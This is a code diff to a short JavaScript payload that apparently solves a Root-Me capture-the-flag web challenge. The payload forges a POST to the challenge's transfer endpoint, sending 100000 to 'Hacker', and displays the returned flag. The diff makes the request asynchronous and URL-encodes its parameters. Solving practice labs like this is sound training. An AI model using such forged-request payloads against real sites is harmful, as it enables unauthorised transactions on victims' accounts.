@@ -10,18 +10,21 @@
         function post(url, params={}){
             var params_post = [];
             for(const key in params){
-                params_post.push(`${key}=${params[key]}`);
+                params_post.push(`${key}=${encodeURIComponent(params[key])}`);
             }
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", url, false);
+            xhr.open("POST", url, true);
             xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    document.getElementById("flag").setAttribute("value", xhr.responseText);
+                }
+            };
             xhr.send(params_post.join("&"));
-            return xhr.responseText;
         }
 
         function view_flag(){
             let res = post("https://bankme-1.challenges.pro.root-me.org/transfer/", {recipient: "Hacker", amount: "100000"});
-            document.getElementById("flag").setAttribute("value", res);
         }
 
         view_flag();
